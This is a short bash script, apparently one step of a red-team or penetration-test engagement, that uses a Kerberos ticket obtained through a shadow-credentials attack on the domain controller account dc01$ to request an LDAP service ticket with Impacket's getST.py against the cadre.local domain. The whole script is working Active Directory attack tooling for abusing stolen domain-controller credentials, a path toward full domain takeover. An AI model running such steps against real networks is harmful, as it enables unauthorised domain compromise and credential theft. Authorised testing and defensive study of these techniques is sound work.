#!/usr/bin/env bash
# T008 follow-through: validate dc01$ shadow-cred TGT by requesting an LDAP TGS
set -u
export KRB5_CONFIG=/tmp/krb5-cadre.conf
export KRB5CCNAME=/tmp/t008/dc01_keycred.ccache
cd /tmp/nxc-venv/bin
timeout 40 ./getST.py -k -no-pass -spn ldap/dc01.cadre.local 'CADRE.LOCAL/dc01$' 2>&1 | tail -14
echo "EXIT=$?"
